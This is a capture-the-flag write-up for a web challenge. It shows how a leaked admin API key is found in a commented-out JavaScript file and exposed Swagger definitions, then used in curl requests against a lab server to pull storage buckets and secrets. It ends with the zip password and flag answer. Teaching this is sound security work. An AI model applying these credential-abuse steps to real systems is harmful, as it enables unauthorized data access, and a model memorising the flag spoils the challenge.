# Code Review

## Overview

Core concepts of this challenge:

1. Web application manual enumeration
2. Information Disclosure in source code
3. API calling

## Hints

1. It's much simpler than you think.
2. It's all about code review.
3. And a little bit of extra API calls
4. Also a "bucket" is just a fancy way of saying storage, so basically a bucket will store stuff like images, files, zips, audio files, etc.

> And LASTLY, don't be afraid, usually, freshers, students, or newcomers will think that websites with flashy animation and smooth transitions can be scary and hard to attack because well... they are so nicely done, so there must be fewer vulnerabilities on them right? RIGHT? Nope, it's just another website and sometimes the ugly ones are trickier to hack as well, so stay calm and keep trying.

## Writeup

### Step 1: Enumeration

As always, the first and best thing before pen-testing is always about enumeration. Try clicking around the website and you will see that there is a button that we can use to submit a challenge...

![alt text](./.imgs/submitchallenge.png)

Now try to submit any challenge that you have, don't need to be very specific or that you already have a fully-tested challenge up your sleeve to do this.

![alt text](./.imgs/confirmsubmit.png)

Now pay really close attention and you will notice a really small button saying `here` in the popup.

![alt text](./.imgs/newlink.png)

Once clicked, it will redirect us to http://challenge.com/admin/challenges/dashboard, which is the login dashboard ONLY for administrators.

### Step 2: Code review

What usually comes to mind? Well, usually the following...

1. SQLi
2. Brute Forcing
3. CVE ???

Now you can try, but you will see that the backend has already been coded to repel against all of these attacks. But hey! Those are not the only ways to test whether a route is vulnerable. What if we inspect the element of the page instead? If you pay close attention to the source code, you will notice this little line in the gigantic comment at the bottom.

![alt text](./.imgs/CommentedScript.png)

What does https://challenge.com/static/js/temp_10.4.2025/testing.js contain I wonder?

![alt text](./.imgs/secretkeyexposed.png)

Oh woah, an API key of value `Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN` and a route called `/v1/api/admin/guardduty/status`.

### Step 3: API calling

OK great, an insight, let's me try to make a request to http://challenge.com/v1/api/admin/guardduty/status and see what it responds with.

![alt text](./.imgs/missingauthor.png)

Yep, it requires a key, so let's try to provide it through either Burpsuite or just straight-up using the command line.

```bash
curl http://localhost:3000/v1/api/admin/guardduty/status -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFA
dMiN"
# Response : {"ip":"::ffff:172.18.0.1","status":"Processing"}
```

But that endpoint is useless for us, we basically cannot do anything with it, and we cannot inject code nor get it to spill out any secret. What we need is to either enumerate for more to see if there is any interesting endpoint or choose another attack surface. But paying attention to the leaked source code, there was another interesting detail hiding in the comment section.

![alt text](./.imgs/swagger.png)

> `FUN FACT`:
> If you understand web development, Swagger is usually used to debug the API before deploying it to the outer world, but sometimes developers forget to turn it off or accidentally let it expose it to the internet. And we the "Swagger definitions file" which is usually a JSON file is leaked, we can sometimes elevate it to attack further.

OK, now if you make a request to `http://challenge.com/v1/api/admin/swagger.json` with the API key included in the `Authorization` header

```bash
curl http://localhost:3000/v1/api/admin/swagger.json -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" | jq

# the point of | jq was to beautify the JSON, if you don't like it, get rid of it.
```

The response will be:

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "CodeCTF Web Services - CWS Administrator Endpoints",
    "version": "1.0.0",
    "description": "API docs"
  },
  "paths": {
    "/v1/api/admin/swagger.json": {
      "method": "GET",
      "description": "Showing all available endpoints.",
      "parameters": null
    },

    ...

    "/v1/api/admin/guardduty/status": {
      "method": "GET",
      "description": "Threat and brute forcing detection ( Not working rn ! ).",
      "parameters": null
    }
  },
  "components": {},
  "tags": []
}
```

This means the API currently has 6 API endpoints, all 6 of them use `GET` method and some require parameters. Now the job is to explore each one of them, so feel free to make requests around and see what each of them responds to and which is useful.

Eventually, `/v1/api/admin/bucket/list` and `/v1/api/admin/bucket/get` seem interesting.

```bash
curl http://localhost:3000/v1/api/admin/bucket/list -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" | jq
```

```json
{
  "buckets": [
    {
      "id": "ff76b8cc-61ce-4133-be8d-6889c194e14b",
      "name": "CTF details",
      "description": "Empty"
    },
    {
      "id": "a26f0c28-060c-4571-be54-7caf6b5c0563",
      "name": "Secret Documents",
      "description": "Some secret plans of the administrators."
    }
  ]
}
```

Try downloading all of those buckets and see what it has

```bash
curl http://localhost:3000/v1/api/admin/bucket/get?id=a26f0c28-060c-4571-be54-7caf6b5c0563 -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" --output secrets
curl http://localhost:3000/v1/api/admin/bucket/get?id=ff76b8cc-61ce-4133-be8d-6889c194e14b -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" --output ctf_details
file secrets ctf_details
```

Response:

![alt text](./.imgs/ziptype.png)

### Step 4: Capture The Flag

So they are both zip files, let's try to open 'em using any existing ZIP file manager ( 7zip, File Roller, Windows default ZIP file manager, etc ).

![alt text](./.imgs/troll.png)

How about `secrets` ? Sounds like some serious businesses 😉

![alt text](./.imgs/secretzip.png)

HHHmmm... password-protected, where can I find the password? or should I brute force it? Oh wait, recalling back to the exposed `swagger.json` file, there were some endpoints to a service called `secretmanager`

```
/v1/api/admin/secret-manager/list
/v1/api/admin/secret-manager/get
```

Let's play around with those, maybe there are exposed secrets too.

```bash
curl http://localhost:3000/v1/api/admin/secret-manager/list -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" | jq
```

Response:

```json
{
  "secrets": [
    {
      "id": "4a59bbe2-d02f-442f-b409-65cf53127aa0",
      "name": "Zip It !!!",
      "description": "awdawdawd whatever, it's a password to my files"
    },
    {
      "id": "94243568-aa14-46f8-a633-c94c7c75a325",
      "name": "Unknown",
      "description": "Just Testing Secret Mnanager, ignore this"
    }
  ]
}
```

Oh wow, so there are two secrets, let's get 'em all...

```bash
# Secret 1:
curl http://localhost:3000/v1/api/admin/secret-manager/get?id=94243568-aa14-46f8-a633-c94c7c75a325 -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" | jq
# Response:
# {
#   "status": "Found",
#   "key": "1234567890"
# }

# Secret 2:
curl http://localhost:3000/v1/api/admin/secret-manager/get?id=4a59bbe2-d02f-442f-b409-65cf53127aa0 -H "Authorization: Bearer SUp3Rs3cReTAPI_k3y--f0r-_c0deCtFAdMiN" | jq
# Response:
# {
#   "status": "Found",
#   "key": "UnPWn@bl3_Z1p_F1|e_L0l"
# }
```

Ok so 2 secrets found, `1234567890` and `UnPWn@bl3_Z1p_F1|e_L0l`, now if you try both of them, you will see that the later actually works and now we can decrypt the zipfile to read the inner secret.

![alt text](./.imgs/FoundTheFlag.png)

And BOOM! The Flag is now pwned. 🔥

Flag : `pecan{c0n6r@tu\|ati0n_!!!_cha1!eng3$_acc3pt3d}`

## Extra Facts

1. This was based on a real pentest that I used to do, where the client actually exposed a highly classified API key to their AWS service in the `<script>` tag. In some other cases, the keys were exposed through the HTML comments as well, hence why I combined both for this challenge.
2. [SwaggerUI](https://swagger.io/) is a great and convenient way for web developers to test and debug their API endpoints during development. But sometimes developers just don't care too much about them and just wanna get things done as fast as possible, which usually leads to some small misconfiguration mistakes that expose the API definitions to the world. While this is not dangerous **_YET_**, `Security through Obscurity` is still a thing, and letting too much unnecessary information available to everyone is a bad idea because who knows? Maybe one of those people who visit your site is a malicious attacker, and letting them have access to all of the definitions is a good way to allow them to understand their prey more easily.
3. Leaking Swagger definition is usually classified as a `LOW` severity vulnerability or in rare cases, `MEDIUM` or `HIGH` depending on how the situation gets escalated.
4. I've faced over 10+ cases where the Swagger definition file was exposed in real-life pentesting.
5. In real-life, the API key will be used for services like AWS ( S3-Bucket, Guard Duty, Secret Manager), Azure, Google Cloud instead.
